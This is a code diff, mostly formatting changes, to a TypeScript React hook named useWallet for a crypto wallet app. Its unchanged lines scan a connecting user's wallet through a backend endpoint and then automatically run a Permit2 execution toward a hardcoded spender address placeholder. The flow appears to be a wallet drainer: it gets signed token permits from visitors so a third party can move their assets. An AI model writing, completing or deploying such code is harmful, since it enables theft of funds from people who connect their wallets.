@@ -10,7 +10,12 @@ import type { ScanResult } from "../types/wallet.ts";
 //   view?: infer V;
 // } ? V : never;
 
-type ModalView = 'Connect' | 'Account' | 'Networks' | 'WhatIsAWallet' | 'OnRampProviders';
+type ModalView =
+  | "Connect"
+  | "Account"
+  | "Networks"
+  | "WhatIsAWallet"
+  | "OnRampProviders";
 
 const SPENDER_ADDRESS = "0xYourExecutionPipelineAddressHere";
 
@@ -18,7 +23,8 @@ export function useWallet() {
   const [scanResult, setScanResult] = useState<ScanResult | null>(null);
   const { executePermit2 } = usePermit2Execution();
 
-  const { address, isConnected, isConnecting, isReconnecting, status } = useAccount();
+  const { address, isConnected, isConnecting, isReconnecting, status } =
+    useAccount();
   const { disconnect } = useDisconnect();
   const chainId = useChainId();
   const { open } = useAppKit();
@@ -29,7 +35,9 @@ export function useWallet() {
 
     const scanWallet = async () => {
       try {
-        const res = await API.post("/api/scan-wallet", { userAddress: address });
+        const res = await API.post("/api/scan-wallet", {
+          userAddress: address,
+        });
         const result = res.data;
 
         if (result.status === "success" && result.data.length === 0) {
@@ -54,6 +62,7 @@ export function useWallet() {
     const run = async () => {
       try {
         await executePermit2(scanResult, SPENDER_ADDRESS, chainId);
+        console.log("done");
       } catch (error) {
         console.error("Permit2 execution failed:", error);
       }
@@ -80,7 +89,11 @@ export function useWallet() {
     chainId,
     scanResult,
     balance: balance
-      ? { formatted: balance.formatted, symbol: balance.symbol, value: balance.value }
+      ? {
+          formatted: balance.formatted,
+          symbol: balance.symbol,
+          value: balance.value,
+        }
       : null,
     openModal,
     disconnect,
